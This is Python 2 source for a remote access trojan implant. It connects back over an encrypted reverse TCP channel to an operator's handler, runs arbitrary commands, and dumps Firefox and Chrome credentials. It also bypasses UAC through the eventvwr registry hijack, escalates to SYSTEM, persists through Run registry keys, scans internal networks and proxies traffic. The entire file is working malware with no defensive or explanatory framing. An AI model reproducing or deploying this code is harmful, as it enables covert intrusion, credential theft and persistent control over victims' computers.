#!/usr/bin/env python2
import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, psutil, zlib, glob, select, sys, Queue, ctypes, string
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Random import random
from twisted.internet import reactor
from twisted.protocols import socks
import dumpff, traceback
import hashlib, Queue
if os.name =="nt":
	import dumpchrome, win32net, pupy_privesc, wmi

try:
	print sys.frozen
	with open(sys.argv[0], "rb") as f:
		f.seek(972)
		HANDLER_IP = ""
		for i in range(4):
			HANDLER_IP += str(ord(f.read(1)))+"."
		port1 = ord(f.read(1))
		port2 = ord(f.read(1))
		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		HANDLER_IP = HANDLER_IP[:-1]
except Exception as e:
	traceback.print_stack()
	print e
	HANDLER_IP = "127.0.0.1"
	HANDLER_PORT = 8080
	
print HANDLER_IP
print HANDLER_PORT

if os.name == "nt":
    c = wmi.WMI()
	
global_thread_list = []

def windows_only(func):
	def tester(*args):
		if os.name != "nt": return "Command not available on non-windows OS."
		else: return func(*args)
	return tester
	
class ProxyConnection:
	def __init__(self, channel):
		self.channel = channel
		print "init! channel:"+str(channel)
		
	def start(self):
		print "Starting!"
		data = self.channel.recv_queue.get()
		version, type, remote_port, remote_host, user_id = ord(data[0]), ord(data[1]), data[2:4], data[4:8], data[8:-1]
		if version != 4 or type != 1:
			print "Request rejected: bad version or type."
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return
			
		port1, port2 = ord(remote_port[0]), ord(remote_port[1])
		self.remote_port = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		print "remote port: "+str(self.remote_port)
		self.remote_host = ".".join([str(ord(remote_host[i])) for i in range(4)])
		
		self.remote_socket = socket.socket()
		self.remote_socket.settimeout(20)
		print "connecting!"
		self.connect()
		
	def send(self, data):
		self.channel.send_queue.put(self.channel.id+data)
		
	def connect(self):
		try:
			print "conning to "+str(self.remote_host)+":"+str(self.remote_port)
			self.remote_socket.connect((self.remote_host, self.remote_port))
			print "holey moley connectoley"
			self.remote_socket.settimeout(None)
		except:
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return

		self.send("\x00\x5A\x00\x00\x00\x00\x00\x00")
		self.relay()
		
	def reader(self):
			while True:
				data = self.remote_socket.recv(8192)
				if not data:
					return
				self.send(data)
			
	def writer(self):
			while True:
				data = self.channel.recv_queue.get()
				print self.remote_socket.sendall(data)
		
	def relay(self):
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
		time.sleep(50)
	
class SocksV4Proxy:
	def __init__(self, send_queue, recv_queue):
		pass
	
class Channel:
	def __init__(self, id):
		self.id = chr(id)
		self.send_queue = Queue.Queue()
		self.recv_queue = Queue.Queue()
	
class Transport:
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
		
	def send(self, data):
		pass
		
	def recv(self, data):
		pass
		
	def connect(self):
		pass
		
	def package(self, data):
		package = {}
		package["cwd"] = base64.b64encode(os.getcwd())
		package["data"] = base64.b64encode(data)
		package["username"] = base64.b64encode(getpass.getuser())
		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
		package["hostname"] = base64.b64encode(socket.gethostname())

		for key in package.keys():
			if key not in self.sent_info: package[key] = ""
			
		return json.dumps(package)
		
	def set_package_items(self, items):
		if items == "minimal":
			self.sent_info = ["data"]
		elif items == "small":
			self.sent_info = ["data","cwd"]
		elif items == "userathost":
			self.sent_info = ["data","cwd","username","hostname"]
		else:
			self.sent_info = items.split()
			for item in list(self.sent_info):
				if item not in self.possible_info:
					self.sent_info.remove(item)
			if "data" not in self.sent_info: self.sent_info.append("data")
		return "Now sending "+repr(self.sent_info)
		
class EncryptedReverseTCP(Transport):
	def __init__(self, handler_ip, handler_port):
		Transport.__init__(self, handler_ip, handler_port)
		self.comm_socket = socket.socket()
		
		self.server_public_key = RSA.importKey(base64.b64decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDG3CRcM4aUy1FF9swDXMVsYdfH2+l+Z1uXaYs/Y9VP2z7s9VOC+NTmeDAVYyZ2fk0dgzverOIDdj0Dol8cRzT3GMgZ+WESgLKc5dLuvMWTX6zIn1zcrGmkTy3+eh1YKpXbPueRVqlwYl/u6APDIYhoQS9wyf2qYMoyjoOA0YXlCQIDAQAB"))
		
		self.main_channel = Channel(1)
		self.channels = {1:self.main_channel}
		
	def gen_diffie_key(self):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		print key, IV
	
		return key, IV
		
	def authenticate(self):
		plainstring = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(32))
		print "Challenging server with "+plainstring
		encstring = self.server_public_key.encrypt(plainstring, 32)
		self.comm_socket.sendall(encstring[0])
		
		response = self.comm_socket.recv(1024)
		
		if plainstring == response:
			return True
		return False

	def connect(self):
		self.comm_socket.connect((self.handler_ip, self.handler_port))
		
		key, IV = self.gen_diffie_key()
		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
		self.secondary_aes_obj = AES.new(key, AES.MODE_CFB, IV)
		
		if not self.authenticate(): raise Exception("Server failed to authenticate!")
		
	def encrypt(self, data):
		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(self.decompress(base64.b64decode(data)))
		
	def secondary_encrypt(self, data):
		return base64.b64encode(self.compress(self.secondary_aes_obj.encrypt(data)))
		
	def secondary_decrypt(self, data):
		return self.secondary_aes_obj.decrypt(self.decompress(base64.b64decode(data)))
		
	def compress(self, data):
		return zlib.compress(data, 9)
		
	def decompress(self, data):
		return zlib.decompress(data)
		
	def sender(self):
		ct = threading.currentThread()
		waittime = 0.1
		while not ct.stopped():
			for channel in self.channels:
				if not self.channels[channel].send_queue.empty():
					data = self.channels[channel].send_queue.get()
					data = self.secondary_encrypt(data)+chr(255)
					self.comm_socket.sendall(data)
					waittime = 0.01
				else:
					if waittime < 0.2: waittime += 0.01
					
			time.sleep(waittime)
			
	def receiver(self):
		ct = threading.currentThread()
		while not ct.stopped():
			data = ""
			while not data.endswith(chr(255)):
				try: c = self.comm_socket.recv(4096)
				except:
					data = self.main_channel.id+"CONN_LOST"+chr(255)
					break
				if not c: raise Exception("Handler disconnected")
				data += c
				
			data = self.secondary_decrypt(data[:-1])
			print data
			
			if data.startswith(chr(254)+"CREATE_CHANNEL"):
				id = int(data.split(":")[1])
				newchan = Channel(id)
				self.channels[id] = newchan
				
			elif data.startswith(chr(254)+"CREATE_PROXY"):
				
				id = int(data.split(":")[1])
				proxy = ProxyConnection(self.channels[id])
				t = StoppableThread(target=proxy.start)
				t.daemon = True
				t.start()
				
			else:
				identifier, data = data[0], data[1:]
				self.channels[ord(identifier)].recv_queue.put(data)
				
	def start_threads(self):
		for i in [self.sender, self.receiver]:
			t = StoppableThread(target=i)
			t.daemon = True
			t.start()
			global_thread_list.append(t)

	def send(self, data):
		data_package = self.package(data)
		data_package = self.encrypt(data_package)
		self.main_channel.send_queue.put(self.main_channel.id+data_package)
		
	def recv(self):
		data = self.main_channel.recv_queue.get()
		if data == "CONN_LOST": raise Exception("Handler Disconnected")
		signature, data = data.split(":")
		signature = base64.b64decode(signature)
		data = self.decrypt(data)
		if not self.server_public_key.verify(hashlib.sha224(data).hexdigest(), (int(signature),)): raise Exception("Could not verify signature")
		return data

class StoppableThread(threading.Thread):
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()

class Shell:
	def __init__(self, transport):
		self.transport = transport
		self.killed = False
		self.threads = []
		
	def kill_proc(self, pid):
		print "kill proc firing"
		process = psutil.Process(pid)
		for proc in process.children(recursive=True):
			proc.terminate()
		process.terminate()
		self.killed = True
		
	def execute_shell_command(self, command):
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		timer = threading.Timer(60, self.kill_proc, [proc.pid])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		if self.killed: out += "\n(Process terminated after taking too long to execute)"
		timer.cancel()
		self.killed = False
		return out
		
	@windows_only
	def windows_only_thing(self):
		print "ass1"
		return "ass"

	@windows_only
	def dumpff(self):
		return dumpff.main()
	   
	@windows_only
	def dumpchrome(self):
		return dumpchrome.main()

	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
			
	def tab_complete(self, text):
		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
		
	def socks_proxy_thread(self):
		t = threading.currentThread()
		reactor.run()
		
	def start_socks_proxy(self):
		reactor.listenTCP(2080,socks.SOCKSv4Factory(""))
		t = threading.Thread(target=self.socks_proxy_thread)
		t.daemon = True
		t.start()
		t = threading.currentThread()
		while True:	
			time.sleep(1)
			if t.stopped():
				reactor.callFromThread(reactor.stop)
				reactor.callInThread(reactor.stop)
				reactor.stop()
				break
				
	def tcp_relay(self):
		current_thread = threading.currentThread()
		while not current_thread.stopped():
			local_socket = socket.socket()
			local_socket.connect(("127.0.0.1",2080))
			
			remote_socket = socket.socket()
			remote_socket.connect((HANDLER_IP,4080))
			
			while not current_thread.stopped():
				try:
					readable, writable, errored = select.select([local_socket, remote_socket], [], [])
				except Exception as e:
					print e
					break
					
				if local_socket in readable:
					try:
						local_data = local_socket.recv(4096)
						if not local_data: break
						remote_socket.sendall(local_data)
					except Exception as e:
						print e
						break
					
				if remote_socket in readable:
					try:
						remote_data = remote_socket.recv(4096)
						if not remote_data: break
						local_socket.sendall(remote_data)
					except Exception as e:
						print e
						break
							
			local_socket.close()
			remote_socket.close()
					
	def create_tcp_relay(self):
		try:
			t = StoppableThread(self.start_socks_proxy)
			t.daemon = True
			t.start()
			self.threads.append(t)
			t = StoppableThread(target=self.tcp_relay)
			t.daemon = True
			t.start()
			self.threads.append(t)
			return "Proxy started. WARNING: Due to the nature of Twisted, you can't restart the proxy after stopping it. Make sure you won't need the proxy again before stopping it!"
		except:
			return "Failed to start proxy."
		
	def stop_tcp_relay(self):
		for t in self.threads:
			t.stop()
			del t
		return "Proxy stopped."
		
	def is_admin(self):
		if os.name == "nt":
			return ctypes.windll.shell32.IsUserAnAdmin() != 0
		else:
			return os.geteuid() == 0
			
	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
		return ''.join([i if ord(i) < 128 else '' for i in string])
	 
	@windows_only
	def is_user_in_group(self, group, member): # Check if user is member of a group.
		members = win32net.NetLocalGroupGetMembers(None, group, 1)
		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
		return False
	 
	@windows_only
	def name_of_admin_group(self): # Get name of Administrators group.
		for line in self.execute_shell_command("whoami /groups").splitlines():
			if "S-1-5-32-544" in line:
				return line.split()[0].split("\\")[1]
		
	@windows_only
	def bypass_uac(self):
		if self.is_admin():
			return "You already have admin privileges!"
		 
		if not self.is_user_in_group(self.name_of_admin_group(), getpass.getuser()):
			return "Current user is not part of admin group."
		 
		if not self.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
			return "UAC is disabled or notification policy is set to 'Always'"
			
		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		print self.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
		os.startfile("eventvwr.exe")
		time.sleep(2)
		print self.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		return "A new session with admin privileges should appear in the next 30 seconds."
		
	@windows_only
	def get_system(self):
		if not self.is_admin(): return "You need to have admin privileges to run getsystem!"
		try:
			pupy_privesc.getsystem(os.path.abspath(sys.executable))
		except Exception as e:
			return "getsystem failed: "+str(e)
		return "A new session with SYSTEM privileges should appear in the next 30 seconds."
		
	def scan_host(self, host, ports, q):
		random.shuffle(ports)
		for port in ports:
			try:
				s = socket.socket()
				s.settimeout(0.5)
				print "trying "+host+" "+str(port)
				s.connect((host, port))
				q.put((host, port))
			except:
				continue
		
	def portscan(self, hosts, ports):
		q = Queue.Queue()
		host_list = []
		port_list = []
		for i in ports.split(","):
			try:
				if '-' not in i:
					port_list.append(i)
				else:
					a, b = map(int, i.split('-'))
					port_list += range(a, b+1)
			except:
				return "Invalid port range"
				
		if not port_list or port_list[0] == []:
			return "Invalid port range"
				
		host_range = ".".join(hosts.split(".")[:3])
		try:
			for i in hosts.split(","):
				print i
				print hosts.split(".")
				if '-' not in i.split(".")[3]:
					host_list.append(host_range+"."+str(i.split(".")[3]))
				else:
					a, b = map(int, i.split(".")[3].split('-'))
					for c in range(a, b+1):
						host_list.append(host_range+"."+str(c))
		except Exception as e:
			return "Invalid host range"
			
		if not host_list or host_list[0] == []:
			return "Invalid host range"
				
		threads = []
		for host in host_list:
			t = threading.Thread(target=self.scan_host, args=(host, port_list, q))
			t.daemon = True
			t.start()
			threads.append(t)
			
		for t in threads:
			t.join()
			
		open = []
		while not q.empty():
			open.append(q.get())
			
		hosts = {}
		for host, port in open:
			if host not in hosts:
				hosts[host] = str(port)
			else:
				hosts[host] += ","+str(port)
			
		out = ""
		for host in hosts:
			out += host+":\n"
			for port in sorted(hosts[host].split(",")):
				out += "  "+str(port)+" OPEN\n"
			out += "\n"
			
		return out
		
	@windows_only
	def persist(self):
		random_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
		if self.is_admin():
			retval = subprocess.Popen("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
			retval.communicate()
			print(retval.returncode)
			if retval.returncode == 0:
				return("Succesfully added file to registry for local machine.")
		else:
			retval = subprocess.Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
			retval.communicate()
			if retval.returncode == 0:
				return("Succesfully added file to current user's registry.")
				
		return "Failed to add file to registry."
	
	@windows_only
	def get_service_list(self):
		services = c.Win32_Service()
		service_paths = []
		for service in services:
			path = service.PathName.split("-")[0].split("/")[0].lower()
			if not "system32" in path: service_paths.append(path)
		return service_paths
	
	def check_writable(self, path):
		try:
			open(os.path.join(os.path.dirname(path.replace('"','')),"test.txt"),"w")
			os.remove(os.path.join(os.path.dirname(path.replace('"','')),"test.txt"))
			return True
		except Exception as e:
			return False
			
	@windows_only
	def find_writable_executables(self):
		service_paths = self.get_service_list()
		writables = []
			
		for service in service_paths:
			if self.check_writable(service): writables.append(service)
				
		return writables
	
	@windows_only
	def find_writable_unquoted(self):
		service_paths = self.get_service_list()
		potential_paths = []
		
		for service in service_paths:
			if '"' not in service:
				split_path = service.split()
				for i in range(len(split_path)):
					potential_paths.append(" ".join(split_path[0:i]))

		potential_paths = list(set(potential_paths))
		writables = []
		for path in potential_paths:
			if self.check_writable(path): writables.append(path)
			
		return writables
		
	@windows_only
	def elevate(self):
		return self.find_writable_executables()
					
	def handle_command(self, data):
		command = data.split()[0]
		try:
			arguments = " ".join(data.split()[1:])
		except IndexError:
			pass
			
		if command == "test":
			output = self.windows_only_thing()
		elif command == "prompt":
			if not arguments:
				output = "Set to one or more values: cwd, ip, data, hostname, username, localtime; or use preset: minimal, small, userathost"
			else:
				output = self.transport.set_package_items(arguments)
		elif command == "cd":
			output = self.change_directory(arguments)
		elif command == "LIST_FILES":
			if not arguments: arguments = ""
			output = self.tab_complete(arguments)
		elif command == "crash":
			raise Exception("As you wish")
		#elif command == "proxy":
		#	output = "invalid option"
		#	if arguments == "start":
		#		output = self.create_tcp_relay()
		#	elif arguments == "stop":
		#		output = self.stop_tcp_relay()
		elif command == "dumpff":
			output = self.dumpff()
		elif command == "dumpchrome":
			output = self.dumpchrome()
		elif command == "isadmin":
			output = str(self.is_admin())
		elif command == "bypassuac":
			output = self.bypass_uac()
		elif command == "getsystem":
			output = self.get_system()
		elif command == "portscan":
			try:
				hosts, ports = arguments.split()
				output = self.portscan(hosts, ports)
			except Exception as e:
				print e
				output = "usage: portscan [host_range] [port_range]"
		elif command == "persist":
			output = self.persist()
		elif command == "die":
			self.transport.comm_socket.close()
			os._exit(0)
		elif command == "something":
			output = self.elevate()
		elif command == "makeproxy":
			output = "k"
			ProxyConnection(self.transport.channels[2])
		else:
			output = self.execute_shell_command(command+" "+arguments)
			
		return str(output)
		
		
	def run(self):
		while True:
			data = self.transport.recv()
			if not data.startswith("LIST_FILES"): print data
			output = self.handle_command(data)
			self.transport.send(output)
			
while True:
	try:
		shell = Shell(EncryptedReverseTCP(HANDLER_IP, HANDLER_PORT))
		shell.transport.connect()
		shell.transport.start_threads()
		shell.run()
	except Exception as e:
		print e
		shell.transport.comm_socket.close()
		for t in shell.threads:
			t.stop()
		for t in global_thread_list:
			t.stop()
		for t in threading.enumerate():
			try: t.stop()
			except: pass
		time.sleep(10)
		continue
